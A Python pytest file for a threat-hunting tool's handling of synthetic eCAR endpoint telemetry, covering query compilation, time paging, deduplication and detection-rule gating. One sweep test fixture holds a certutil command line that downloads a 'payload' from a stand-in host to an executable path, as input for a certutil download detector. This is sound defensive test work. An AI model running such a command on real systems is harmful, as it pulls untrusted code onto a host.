"""Synthetic eCAR records/mappings follow the public schema, never OpTC telemetry.

https://github.com/FiveDirections/OpTC-data/blob/master/ecar.md
https://github.com/FiveDirections/OpTC-data/blob/master/errata.md
https://car.mitre.org/data_model/
"""
from datetime import timedelta

import pytest

from romulus.sources.compile import compile_es
from romulus.sources.es import _exact_time
from romulus.sources.models import Predicate, SearchIntent
from romulus.sources.profile import contract_from_types
from tests.test_host_shapes_profile import WINDOW


def ecar_types(stamp='timestamp_ms'):
    return {stamp: 'long', 'object': 'keyword', 'action': 'keyword', 'objectID': 'keyword', 'actorID': 'keyword',
            'hostname': 'keyword', 'properties': 'flattened', 'pid': 'long', 'ppid': 'long', 'id': 'keyword'}


@pytest.mark.parametrize('stamp', ['timestamp_ms', 'timestamp'])
def test_ecar_profile_contract_and_numeric_time_are_explicit(stamp):
    current = contract_from_types('raw', ecar_types(stamp))
    assert current.ecar and current.role == 'host' and current.os_family == 'windows'
    assert current.time_field == stamp and current.fields['host.name'].native == 'hostname'
    assert current.fields['process.command_line'].native == 'properties.command_line'
    assert current.linux_text_mixed is False
    assert not any(current.supports(name, 'eq') for name in ('event.code', 'event.channel', 'event.provider'))
    query = compile_es(SearchIntent(kind='raw', target='raw', window=WINDOW,
        filters=[Predicate(field='host.name', op='eq', value='client')]), current)
    assert query.time_unit == 'epoch_ms'
    assert query.body['query']['bool']['filter'][0] == {
        'range': {stamp: {'gte': int(WINDOW.start.timestamp() * 1000), 'lt': int(WINDOW.end.timestamp() * 1000)}}}
    assert query.body['sort'][0] == {stamp: {'order': 'asc'}}
    histogram = compile_es(SearchIntent(kind='histogram', target='raw', window=WINDOW, interval_seconds=300), current)
    assert histogram.body['aggs']['h']['histogram']['interval'] == 300_000


def test_ecar_pipeline_date_and_existing_date_tie_paging_stay_dates():
    current = contract_from_types('raw', {**ecar_types(), '@timestamp': 'date', 'message': 'text'})
    query = compile_es(SearchIntent(kind='raw', target='raw', window=WINDOW), current)
    assert current.ecar and current.time_field == '@timestamp' and current.linux_text_mixed is False
    assert query.time_unit == 'ms' and query.body['sort'][0]['@timestamp']['format']
    assert _exact_time(1735689600123, 'ms')['format'] == 'strict_date_optional_time_nanos'


def test_numeric_millisecond_tie_range_is_not_an_iso_date():
    assert _exact_time(1735689600123, 'epoch_ms') == {'gte': 1735689600123, 'lte': 1735689600123}


@pytest.mark.parametrize('order', ['asc', 'desc'])
def test_numeric_millisecond_opensearch_ties_page_every_record_once(order):
    from tests.test_sources_opensearch import SimSearch, query, read_all

    class NumericSim(SimSearch):
        def _matches(self, clause, doc):
            if 'range' in clause:
                bounds = next(iter(clause['range'].values()))
                assert 'format' not in bounds and all(isinstance(value, int) for value in bounds.values())
                return any(all(op not in bounds or test(t, bounds[op]) for op, test in (
                    ('gte', lambda a, b: a >= b), ('gt', lambda a, b: a > b),
                    ('lte', lambda a, b: a <= b), ('lt', lambda a, b: a < b))) for t in doc['t'])
            return super()._matches(clause, doc)

    sim = NumericSim.from_counts([3, 4, 2, 6])
    compiled = query(order=order).model_copy(update={'time_unit': 'epoch_ms'})
    compiled.body['query'] = {'match_all': {}}
    ids, pages = read_all(sim, compiled, page_size=3)
    assert sorted(ids) == sorted(doc['id'] for doc in sim.docs) and len(ids) == len(set(ids))
    assert any('from' in body for body in sim.searches)
    assert all(not meta['problems'] for _hits, meta in pages)


def test_real_sweep_deduplicates_uuid_across_partitions_but_not_object_id(tmp_path):
    from romulus.config import Settings
    from romulus.detect.windows_proxy import CertutilDownloadDecode
    from romulus.hunt.sweep import Sweep
    from romulus.sources.es import ElasticClient
    from romulus.sources.models import Window
    from tests.test_ecar import ecar_hit
    from tests.test_sweep import _repo
    from tests.throughput_fixture import MiniES

    t0 = WINDOW.start + timedelta(hours=1)
    docs = []
    for i, identity in enumerate(['11111111-1111-4111-8111-111111111111',
                                  '11111111-1111-4111-8111-111111111111',
                                  '11111111-1111-4111-8111-111111111112']):
        hit = ecar_hit(properties={'image_path': r'C:\Windows\System32\certutil.exe',
            'command_line': 'certutil.exe -urlcache -split -f https://example.test/payload C:\\x.exe'},
            id=identity, timestamp_ms=int((t0 + timedelta(minutes=i*5)).timestamp()*1000))
        hit['_index'], hit['_id'] = 'raw', f'copy-{i}'
        hit['_source']['@timestamp'] = (t0 + timedelta(minutes=i*5)).isoformat()
        docs.append(hit)
    current = contract_from_types('raw', {**ecar_types(), '@timestamp': 'date'})
    native = MiniES({'raw': docs}, {'raw': '@timestamp'})
    client = ElasticClient(Settings(es_url='http://es.invalid'), transport=native.transport())
    repo = _repo()
    runner = Sweep(repo, client, 'h1', WINDOW, {'raw': current}, stage_dir=tmp_path)
    runner.pack = [CertutilDownloadDecode()]
    runner._profiles = {'raw': {'role': 'host', 'os_family': 'windows', 'datasets': {}, 'ecar': True}}
    try:
        runner._prepare_windows_inventory('raw', current)
        assert 'raw' not in runner._windows_inventory
        for i in range(3):
            start = t0 + timedelta(minutes=i*5)
            runner.run_partition('raw', current, [], Window(start=start, end=start+timedelta(minutes=5)), est=1)
        runner.finalize()
        assert runner.stats['records'] == 3 and runner.stats['events'] == 2
        assert runner.stats['skips']['duplicate typed event across source partitions'] == 1
        assert len(repo.candidates('h1')) == 2
        assert not runner.stats.get('windows_inventory')
        assert sum(runner.stats['ecar_shapes']['raw'].values()) == 3
        cells = repo.rule_cells('h1')
        assert any('collection not attested: eCAR sensor' in str(cell['detail']) for cell in cells)
        assert not any('event class inventory unavailable' in str(cell['detail']) for cell in cells)
    finally:
        runner.close_stage()
        repo.engine.dispose()


def test_ecar_profile_pages_dynamic_hostname_and_reports_native_time_fallback_gap():
    from romulus.sources.profile import build_profile
    from tests.test_host_shapes_profile import ProfileClient, mapping

    class Client(ProfileClient):
        def __init__(self):
            self.fields = {**ecar_types(), 'timestamp': 'long', 'hostname': 'text', 'hostname.keyword': 'keyword'}
            self.bodies = []

        def mapping(self, target):
            return mapping(self.fields)

        def search(self, target, body):
            self.bodies.append(body)
            if 'hosts' in body.get('aggs', {}):
                cfg = body['aggs']['hosts']['composite']
                assert cfg['sources'] == [{'host': {'terms': {'field': 'hostname.keyword'}}}]
                after = cfg.get('after')
                return {'hits': {'total': {'value': 2, 'relation': 'eq'}}, 'aggregations': {
                    'hosts': {'buckets': [{'key': {'host': 'host02' if after else 'host01'}, 'doc_count': 1}],
                              **({} if after else {'after_key': {'host': 'host01'}})}, 'ds': {'buckets': []},
                    'tmin': {'value': 1735689600123}, 'tmax': {'value': 1735689601123}}}
            return {'hits': {'total': {'value': 1 if body['query']['bool'].get('must_not') else 2, 'relation': 'eq'}}}

    profile, current = build_profile(Client(), 'raw')
    assert current.ecar and profile.os_family == 'windows'
    assert profile.hosts == {'host01': 1, 'host02': 1}
    assert current.fields['host.name'].aggregation_native == 'hostname.keyword'
    assert profile.time_min == '2025-01-01T00:00:00.123000+00:00'
    assert profile.model_dump()['windows_shapes']['ecar']['records'] == 2
    [gap] = profile.model_dump()['temporal_gaps']
    assert gap['primary'] == 'timestamp_ms' and gap['alternate'] == 'timestamp' and gap['records'] == 1
    assert current.temporal_gaps == (gap['reason'],)


def test_ecar_shape_inventory_stays_bounded_across_batches_and_keeps_known_catalog_pairs():
    import json

    from romulus.hunt.sweep import Sweep

    runner = object.__new__(Sweep)
    runner.stats = {}
    runner.partial_reasons = []
    for batch in range(5):
        for n in range(100):
            runner._record_ecar_shape('raw', 'ecar:' + json.dumps([f'CUSTOM-{batch}-{n}', 'CREATE'], separators=(',', ':')), 1)
    runner._record_ecar_shape('raw', 'ecar:["PROCESS","CREATE"]', 2)
    counts = runner.stats['ecar_shapes']['raw']
    assert len(counts) == 258 and sum(counts.values()) == 502
    assert counts['ecar:object/action inventory truncated'] == 244
    assert counts['ecar:["PROCESS","CREATE"]'] == 2
    assert any('additional pair identities not retained' in reason for reason in runner.partial_reasons)
    assert runner.stats['ecar_inventory_notes']['raw']


def test_ecar_code_gated_rule_is_unresolved_and_semantic_rule_has_sensor_reason(tmp_path):
    from romulus.detect.registry import ALL_PLAYBOOKS
    from romulus.detect.windows_proxy import CertutilDownloadDecode
    from romulus.hunt.sweep import Sweep
    from tests.test_sweep import _repo

    current = contract_from_types('raw', ecar_types())
    repo = _repo()
    runner = Sweep(repo, None, 'h1', WINDOW, {'raw': current}, stage_dir=tmp_path)
    try:
        gated = next(cls() for cls in ALL_PLAYBOOKS if cls.id == 'win.account_creation')
        assert runner._windows_rule_reasons('raw', current, gated, [], []) == [
            'collection not attested: eCAR sensor', 'eCAR records have no Windows event id']
        assert runner._windows_rule_reasons('raw', current, CertutilDownloadDecode(), [], []) == [
            'collection not attested: eCAR sensor']
    finally:
        runner.close_stage()
        repo.engine.dispose()


def test_ecar_property_notices_affect_only_the_catalogued_family_and_unknown_pairs_none():
    from romulus.evidence.normalize import normalize_hits
    from romulus.hunt.sweep import Sweep
    from tests.test_ecar import ecar_hit

    families = {}
    docs = [ecar_hit(properties={'image_path': 'cmd.exe', 'unexpected': 'value'}),
            ecar_hit('FLOW', 'START', properties={'src_port': 'bad'}),
            ecar_hit('UNKNOWN', 'ACTION', properties={})]
    _events, skips, errors = normalize_hits(docs, skip_families=families)
    assert not errors
    affected, not_assessed = Sweep._unsupported_families(Sweep._unsupported_skips(skips), families)
    assert affected == {'process_exec', 'net_socket'}
    assert not_assessed == {'eCAR unsupported object/action: not typed': 1}


@pytest.mark.parametrize('native', ['{22222222-2222-4222-8222-222222222222}',
                                   '22222222222242228222222222222222',
                                   'urn:uuid:22222222-2222-4222-8222-222222222222'])
def test_uuid_aliases_do_not_claim_exact_native_selection_after_canonicalization(native):
    from romulus.evidence.ecar import normalize_ecar
    from romulus.sources.compile import CompileError
    from tests.test_ecar import ecar_hit

    event = normalize_ecar(ecar_hit(id=native, objectID=native))
    assert event.get('process.entity_id') == 'ecar:22222222-2222-4222-8222-222222222222'
    assert event.get('ecar.record_id') == '22222222-2222-4222-8222-222222222222'
    current = contract_from_types('raw', ecar_types())
    for field in ('process.entity_id', 'ecar.record_id'):
        assert not current.supports(field, 'eq') and not current.supports(field, 'in')
        assert current.supports(field, 'exists')
        assert not current.spec(field).aggregatable
        with pytest.raises(CompileError, match='superset guarantee'):
            compile_es(SearchIntent(kind='raw', target='raw', window=WINDOW,
                filters=[Predicate(field=field, op='eq', value=event.get(field))]), current)


def test_real_ecar_host_link_reads_later_endpoint_event(tmp_path):
    from romulus.config import Settings
    from romulus.evidence.ecar import normalize_ecar
    from romulus.hunt.links import LinkAnchor, LinkFetcher, LinkWindow
    from romulus.hunt.pivot import PivotExecutor
    from romulus.sources.es import ElasticClient
    from tests.test_ecar import ecar_hit
    from tests.test_sweep import _repo
    from tests.throughput_fixture import MiniES

    rows = []
    for n in range(2):
        row = ecar_hit(id=f'11111111-1111-4111-8111-{n+1:012d}')
        row['_index'], row['_id'] = 'raw', f'endpoint-{n}'
        row['_source']['@timestamp'] = (WINDOW.start+timedelta(hours=1, seconds=n)).isoformat()
        rows.append(row)
    current = contract_from_types('raw', {**ecar_types('timestamp'), '@timestamp': 'date'})
    client = ElasticClient(Settings(es_url='http://es.invalid'),
        transport=MiniES({'raw': rows}, {'raw': '@timestamp'}).transport())
    repo = _repo()
    root = normalize_ecar(rows[0])
    anchor = LinkAnchor(finding_id='root', ts=root.ts, host=root.host, event_ids=[root.id], events=[root])
    try:
        executor = PivotExecutor(repo, client, 'h1', {'raw': current}, stage_dir=tmp_path)
        result = LinkFetcher(executor, WINDOW.start, WINDOW.end).fetch(anchor, 'host_after_anchor',
            LinkWindow(label='after root', start=root.ts, end=root.ts+timedelta(minutes=5)))
        assert result.status == 'complete', result.reasons
        assert result.event_ids == [normalize_ecar(rows[1]).id]
    finally:
        repo.engine.dispose()


@pytest.mark.parametrize('start_us,end_us,expected', [(0, 500, (0, 1)), (500, 1500, (1, 2)),
                                                    (1000, 1500, (1, 2))])
def test_native_millisecond_range_never_loses_fractional_window_edges(start_us, end_us, expected):
    from romulus.sources.models import Window

    window = Window(start=WINDOW.start+timedelta(microseconds=start_us), end=WINDOW.start+timedelta(microseconds=end_us))
    current = contract_from_types('raw', ecar_types())
    query = compile_es(SearchIntent(kind='raw', target='raw', window=window), current)
    bounds = query.body['query']['bool']['filter'][0]['range']['timestamp_ms']
    epoch = int(WINDOW.start.timestamp()*1000)
    assert (bounds['gte']-epoch, bounds['lt']-epoch) == expected
